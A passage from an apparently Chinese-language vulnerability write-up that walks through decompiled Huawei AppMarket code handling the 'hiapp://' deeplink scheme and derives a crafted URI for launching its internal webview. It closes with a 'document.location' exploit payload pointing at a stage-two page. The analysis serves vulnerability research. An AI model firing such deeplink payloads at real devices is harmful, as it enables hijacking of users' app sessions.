scheme, host);  <span class="comment">// 注意这里实际上是调用AppViewAction.handlerUri处理自定义的url</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到这里，实际就快要接近我们的目标，处理自定义scheme的地方。下面是关键的handlerUri函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">handlerUri</span><span class="params">(Uri uri, String scheme, String host)</span> </span>&#123;  <span class="comment">// 处理hiapp协议</span></span><br><span class="line">        <span class="keyword">if</span>((<span class="string">&quot;https&quot;</span>.equals(scheme)) &amp;&amp; (<span class="string">&quot;a.vmall.com&quot;</span>.equals(host))) &#123;</span><br><span class="line">            <span class="keyword">this</span>.openActivityByUrl(uri);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((<span class="string">&quot;hiapp&quot;</span>.equals(scheme)) &amp;&amp; (<span class="string">&quot;com.huawei.appmarket&quot;</span>.equals(host))) &#123;</span><br><span class="line">            String activityName = uri.getQueryParameter(<span class="string">&quot;activityName&quot;</span>);</span><br><span class="line">            String params = uri.getQueryParameter(<span class="string">&quot;params&quot;</span>);</span><br><span class="line">            String channelId = uri.getQueryParameter(<span class="string">&quot;channelId&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!TextUtils.isEmpty(((CharSequence)activityName))) &#123;</span><br><span class="line">                JSONArray jsonArry = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(!TextUtils.isEmpty(((CharSequence)params))) &#123;</span><br><span class="line">                        jsonArry = <span class="keyword">new</span> JSONObject(params).getJSONArray(<span class="string">&quot;params&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    e.a().c(channelId);</span><br><span class="line">                    a.c(<span class="string">&quot;AppViewAction&quot;</span>, <span class="string">&quot;open hiapp:&quot;</span> + activityName);</span><br><span class="line">                    com.huawei.appmarket.service.activitydispatcher.OpenGateway$b classB = OpenGateway.a(activityName, jsonArry);<span class="comment">//这里注意一个点，传进去的第二参数是jsonArry,该调用链里进行处理成Param类,第三阶段构造参数的时候会讲到。</span></span><br><span class="line">                    <span class="keyword">if</span>(classB == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        goto label_47;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(classB.getClassI() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">this</span>.callback.startActivity(classB.getClassI(), <span class="number">0</span>);  <span class="comment">// 启动对应的Activity</span></span><br><span class="line">                        goto label_47;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(classB.getIntent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">this</span>.callback.startActivity(classB.getIntent());  <span class="comment">// 启动对应的Activity</span></span><br><span class="line">                        goto label_47;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    a.e(<span class="string">&quot;AppViewAction&quot;</span>, <span class="string">&quot;can not start target activity.Go MainActivity&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(JSONException v0_1) &#123;</span><br><span class="line">                    a.e(<span class="string">&quot;AppViewAction&quot;</span>, <span class="string">&quot;can not get params:&quot;</span> + v0_1.toString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                a.e(<span class="string">&quot;AppViewAction&quot;</span>, <span class="string">&quot;can not find activityName.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        label_47:</span><br><span class="line">            <span class="keyword">this</span>.callback.finish();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么现在的问题是，调用了startActivity去启动，activityName是怎么控制的，启动的又是哪个具体的Activity，换言之，我们可以控制去启动什么Activity。<br>由上面代码可知，关键点为:<strong>com.huawei.appmarket.service.activitydispatcher.OpenGateway$b classB = OpenGateway.a(activityName, jsonArry)</strong><br>也即此处的classB就是我们可以控制启动的Activity</p><p>跟进这个函数，往下跟可以看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">OpenGateway.class</span><br><span class="line"><span class="keyword">int</span> index = activityName.indexOf(<span class="number">124</span>); <span class="comment">// ascii码124是: |</span></span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>) &#123;</span><br><span class="line">            Class Claazz = OpenGateway.getFromMap(activityName.substring(<span class="number">0</span>, index));  <span class="comment">// 从可以启动的ActivityMap中取出activityName对应的class</span></span><br><span class="line">            <span class="keyword">if</span>(Claazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                String v0_1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                String activityNameValue = activityName.length() &gt;= index + <span class="number">1</span> ? activityName.substring(index + <span class="number">1</span>) : v0_1;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> Claazz.newInstance().a(activityNameValue, paramLst);<span class="comment">//关键的调用方法，也是我们接下来解析的重点</span></span><br><span class="line">                &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Class <span class="title">getFromMap</span><span class="params">(String arg1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> OpenGateway.ACTIVITYMAP.get(arg1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路一样，我们先找到put值的地方。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OpenGateway.class</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String arg1, Class arg2)</span> </span>&#123;</span><br><span class="line">        OpenGateway.ACTIVITYMAP.put(arg1, arg2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查看该函数的引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   OpenGateway.a(<span class="string">&quot;activityName&quot;</span>, com.huawei.appmarket.service.activitydispatcher.b.a.class);</span><br><span class="line">   OpenGateway.a(<span class="string">&quot;activityUri&quot;</span>, com.huawei.appmarket.service.activitydispatcher.b.b.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据以上,Clazz.newInstance().a(activityNameValue, paramLst);这里的a方法由参数activityName单竖号(|)前的值控制,可为activityUri或activityName,而单竖号后的值，控制着要启动的Activity。</p><p>到这里我们先小结一下,根据上面的代码跟踪，我们可以构造的自定义Uri类似于:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hiapp:&#x2F;&#x2F;com.huawei.appmarket?activityName&#x3D;activityUri|xxxxxxx&amp;params&#x3D;&#123;&#125;&amp;channelId&#x3D;1</span><br><span class="line">或者</span><br><span class="line">hiapp:&#x2F;&#x2F;com.huawei.appmarket?activityName&#x3D;activityName|xxxxxxx&amp;params&#x3D;&#123;&#125;&amp;channelId&#x3D;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来我们第二阶段的目标就是弄清楚,单竖号后的值应该怎么构造？第三阶段目标是弄清楚params怎么构造？</p><p>我们跟进com.huawei.appmarket.service.activitydispatcher.b.b.class的a方法查看.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> com.huawei.appmarket.service.activitydispatcher.<span class="function">OpenGateway$b <span class="title">a</span><span class="params">(String activity, List paramLst)</span> </span>&#123;</span><br><span class="line">        i classI;</span><br><span class="line">        com.huawei.appmarket.service.activitydispatcher.OpenGateway$b relClass = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(TextUtils.isEmpty(((CharSequence)activity))) &#123;</span><br><span class="line">            com.huawei.appmarket.sdk.foundation.b.a.a.a.e(<span class="string">&quot;ActivityUriProvider&quot;</span>, <span class="string">&quot;activityUri is NULL&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(c.b(activity) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            com.huawei.appmarket.sdk.foundation.b.a.a.a.e(<span class="string">&quot;ActivityUriProvider&quot;</span>, <span class="string">&quot;can not find activityUri:&quot;</span> + activity);  <span class="comment">// 在ActivityUriProvider中(实际上是个map)查询activity是否存在</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            com.huawei.appmarket.service.activitydispatcher.OpenGateway$b tmpB = <span class="keyword">new</span> com.huawei.appmarket.service.activitydispatcher.OpenGateway$b();</span><br><span class="line">            <span class="keyword">if</span>(paramLst != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Bundle b = <span class="keyword">new</span> Bundle();<span class="comment">//构造bundle传递params参数</span></span><br><span class="line">                <span class="keyword">if</span>(b.a(paramLst, b)) &#123;<span class="comment">//这里的b.a函数处理params参数，实际上调用的是a.a</span></span><br><span class="line">                    classI = <span class="keyword">new</span> i(activity, <span class="keyword">new</span> k(activity).a(b).b());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    com.huawei.appmarket.sdk.foundation.b.a.a.a.e(<span class="string">&quot;ActivityUriProvider&quot;</span>, <span class="string">&quot;param error,goMainActivity&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> relClass;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                classI = <span class="keyword">new</span> i(activity, <span class="keyword">new</span> k(activity).a().b());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            tmpB.a(classI);  <span class="comment">// setClassI</span></span><br><span class="line">            relClass = tmpB;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> relClass;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里可以分析到c.b(activity)即是允许构造的activity名称检验，跟进这条调用链，同样是map，思路同上，这里直接给出结果如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        c.a(<span class="string">&quot;installmgr.activity&quot;</span>, AppInstallActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;updatemgr.activity&quot;</span>, AppUpdateActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;appmove.activity&quot;</span>, AppMoveActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;hisuiteconnect.activity&quot;</span>, HiSuiteConnectActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;main.activity&quot;</span>, MainActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;gameboxmain.activity&quot;</span>, GameBoxMainActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;market.activity&quot;</span>, MarketActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;gamebox.activity&quot;</span>, GameBoxActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;appzone.activity&quot;</span>, AppZoneActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;game.h5.error.activity&quot;</span>, GameH5ErrorActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;thirdappupdate.activity&quot;</span>, ThirdUpdateActivity.class);</span><br><span class="line">        c.b(<span class="string">&quot;wlanapplist.fragment&quot;</span>, d.class);</span><br><span class="line">        c.b(<span class="string">&quot;marketpersonal.fragment&quot;</span>, MarketPersonalFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;marketpersonaloversea.fragment&quot;</span>, MarketPersonalFragmentOversea.class);</span><br><span class="line">        c.b(<span class="string">&quot;manager.fragment&quot;</span>, ManagerFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;paymentapplist.fragment&quot;</span>, com.huawei.appmarket.service.paymentapp.a.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        c.a(<span class="string">&quot;gamereserved.activity&quot;</span>, AppReservedActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;purchasehistory.activity&quot;</span>, PurchaseHistoryActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;apptraceedit.activity&quot;</span>, AppTraceEditActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;permissions.activity&quot;</span>, PermissionsActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;pushmessage.activity&quot;</span>, PushMessageActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;pushdownloadalert.activity&quot;</span>, PushDownloadAlertActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;appdetail.activity&quot;</span>, AppDetailActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;appdetailreply.activity&quot;</span>, AppDetailReplyActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;video.activity&quot;</span>, VideoActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;installfailed.activity&quot;</span>, InstallFailDescriptionActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;share_dialog.activity&quot;</span>, ShareDialogActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;sns_share_dialog.activity&quot;</span>, SnsShareDialogActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;weibo_share_dialog.activity&quot;</span>, WeiboShareDialogActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;gallery.activity&quot;</span>, GalleryActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;apkmgr.activity&quot;</span>, ApkManagementActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;third_app_download.activity&quot;</span>, ThirdAppDownloadActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;child.mode.proxy.activity&quot;</span>, ProxyActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;webview.activity&quot;</span>, WebViewActivity.class);</span><br><span class="line">        c.a(<span class="string">&quot;search.activity&quot;</span>, SearchActivity.class);</span><br><span class="line">        c.b(<span class="string">&quot;gamereserved.fragment&quot;</span>, b.class);</span><br><span class="line">        c.b(<span class="string">&quot;updatemgr.fragment&quot;</span>, UpdateManagerFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;apptraceleftlist.fragment&quot;</span>, com.huawei.appmarket.service.pay.purchase.a.class);</span><br><span class="line">        c.b(<span class="string">&quot;apptracerightlist.fragment&quot;</span>, com.huawei.appmarket.service.pay.purchase.a.class);</span><br><span class="line">        c.b(<span class="string">&quot;appzonelist.fragment&quot;</span>, com.huawei.appmarket.service.pay.purchase.c.class);</span><br><span class="line">        c.b(<span class="string">&quot;appzoneeditlist.fragment&quot;</span>, com.huawei.appmarket.service.pay.purchase.b.class);</span><br><span class="line">        c.b(<span class="string">&quot;applist.fragment&quot;</span>, com.huawei.appmarket.framework.fragment.b.class);</span><br><span class="line">        c.b(<span class="string">&quot;appcategory.fragment&quot;</span>, AppCategoryFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;appdetail.fragment&quot;</span>, AppDetailFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;appsubcategory.fragment&quot;</span>, AppSubCategoryFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;appcomment.fragment&quot;</span>, AppCommentFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;appintroduce.fragment&quot;</span>, AppIntroduceFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;apprecommend.fragment&quot;</span>, AppRecommendFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;appreply.fragment&quot;</span>, AppReplyFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;appnocontent.fragment&quot;</span>, AppNoContentFragment.class);</span><br><span class="line">        c.b(<span class="string">&quot;loading.fragment&quot;</span>, j.class);</span><br><span class="line">        c.b(<span class="string">&quot;loadingex.fragment&quot;</span>, LoadingFragmentEx.class);</span><br><span class="line">        c.b(<span class="string">&quot;Tipsloading.fragment&quot;</span>, n.class);</span><br><span class="line">        c.b(<span class="string">&quot;installfailed.fragment&quot;</span>, d.class);</span><br><span class="line">        c.b(<span class="string">&quot;tabapplist.fragment&quot;</span>, l.class);</span><br><span class="line">        c.b(<span class="string">&quot;hotword.fragment&quot;</span>, e.class);</span><br><span class="line">        c.b(<span class="string">&quot;autocomplete.fragment&quot;</span>, com.huawei.appmarket.service.search.view.a.a.class);</span><br><span class="line">        c.b(<span class="string">&quot;search.fragment&quot;</span>, com.huawei.appmarket.service.search.view.a.c.class);</span><br><span class="line">        c.b(<span class="string">&quot;searchresult.fragment&quot;</span>, g.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个参数即是我们可以控制的欲启动的activity的值(单竖号后的值)</p><p>第三阶段，我们需要弄明白怎么去构造params参数里的值，在handlerUri函数传进来的是jsonArry,之后经过处理后变成Param类，再构造成Bundle.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Nullable</span> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List <span class="title">a</span><span class="params">(JSONArray inJsonArry)</span> </span>&#123;</span><br><span class="line">        ArrayList v0_2;</span><br><span class="line">        List v0 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(inJsonArry != <span class="keyword">null</span> &amp;&amp; inJsonArry.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            ArrayList relLst = <span class="keyword">new</span> ArrayList();</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; inJsonArry.length(); ++i) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    JSONObject jsonObj = inJsonArry.getJSONObject(i);</span><br><span class="line">                    Param param = <span class="keyword">new</span> Param();</span><br><span class="line">                    param.fromJson(jsonObj);</span><br><span class="line">                    ((List)relLst).add(param);</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">        <span class="keyword">return</span> ((List)v0_2);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">b.a(paramLst, b) 函数实际为b的父类a，也即调用了a.a方法，讲Param类参数设置进bundle中。</span><br></pre></td></tr></table></figure><p>查看Param类可知,我们可构造的参数有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String iv;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> String type;</span><br><span class="line"><span class="keyword">private</span> String value;</span><br></pre></td></tr></table></figure><p>至此，我们最终构造的uri为:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hiapp://com.huawei.appmarket?activityName=activityUri|webview.activity&amp;params=&#123;&#x27;params&#x27; : [ &#123; &#x27;name&#x27; : &#x27;xxx&#x27;, &#x27;type&#x27; : &#x27;xxx&#x27;, &#x27;value&#x27; : &#x27;xxx&#x27; &#125;, &#123; &#x27;name&#x27; : &#x27;xxx&#x27;, &#x27;type&#x27; : &#x27;xxx&#x27;, &#x27;value&#x27; : &#x27;xxxx&#x27; &#125; ] &#125;&amp;channelId=1</span><br></pre></td></tr></table></figure><p>小结一下:我们从之前代码分析可知，这里能控制的参数是非常多以及涉及到很多类，因此是有比较大的攻击面。</p><p>由于是顺着漏洞作者发现的漏洞进行分析，所以这里进入分析webview.activity所启动的类，也即如何来构造各个值，达到控制的结果。</p><p>跟进 WebViewActivity.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg4)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg4);</span><br><span class="line">        Request request = <span class="keyword">this</span>.getProtocol().getRequest();  <span class="comment">// this.delegate.a();</span></span><br><span class="line">        <span class="keyword">this</span>.mWebvewDelegate = <span class="keyword">this</span>.createDelegate(request);  <span class="comment">// webViewDelegate 初始化为具体的类</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.mWebvewDelegate == <span class="keyword">null</span>) &#123;</span><br><span class="line">            a.e(WebViewActivity.TAG, <span class="string">&quot;mWebvewDelegate is null,uri=&quot;</span> + <span class="keyword">this</span>.mDelegateUri);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            String url = request.getUrl();  <span class="comment">// 获取到第二个参数url</span></span><br><span class="line">            <span class="keyword">if</span>(!g.isEmpty(url)) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">this</span>.mWebvewDelegate.check(((Context)<span class="keyword">this</span>), request)) &#123;  </span><br><span class="line">                    <span class="keyword">this</span>.finish();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.mWebvewDelegate.onCreate(((Context)<span class="keyword">this</span>), request);</span><br><span class="line">                    <span class="keyword">this</span>.setContentView();</span><br><span class="line">                    <span class="keyword">this</span>.mWebvewDelegate.initView(((Context)<span class="keyword">this</span>), request);<span class="comment">//我是彩蛋</span></span><br><span class="line">                    <span class="keyword">this</span>.mWebvewDelegate.loadPage(url);  <span class="comment">// 加载url</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里有个步骤是怎么把传过来的bundle转换成request并作处理，这一部分不做分析，读者可自行尝试。<br>实际上这里仅需要构造两个参数uri和url,uri控制着启动Activity,url控制着需要load的页面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebviewConfig</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WebviewConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//第一个参数即为uri</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        WebviewFactory.INSTANCE.registerDelegate(<span class="string">&quot;internal_webview&quot;</span>, InternalWebviewDelegate.class);  <span class="comment">// internal_webview</span></span><br><span class="line">        WebviewFactory.INSTANCE.registerDelegate(<span class="string">&quot;external_webview&quot;</span>, InternalWebviewDelegate.class);</span><br><span class="line">        WebviewFactory.INSTANCE.registerDelegate(<span class="string">&quot;user_privacy_webview&quot;</span>, UserPrivacyWebviewDelegate.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们最终可以构造的URI为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.location = <span class="string">&quot;hiapp://com.huawei.appmarket?activityName=activityUri|webview.activity&amp;params=&#123;&#x27;params&#x27; : [ &#123; &#x27;name&#x27; : &#x27;uri&#x27;, &#x27;type&#x27; : &#x27;String&#x27;, &#x27;value&#x27; : &#x27;internal_webview&#x27; &#125;, &#123; &#x27;name&#x27; : &#x27;url&#x27;, &#x27;type&#x27; : &#x27;String&#x27;, &#x27;value&#x27; : &#x27;http://www.vmall.com:8000/stage2.html&#x27; &#125; ] &#125;&amp;channelId=1&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到，在loadPage之前是有安全性检验的，必须是指定的域名匹配后才能够通过，因此这里是没办法load自定义的url的。</p><p>但是,第一部分漏洞的关键点就是: 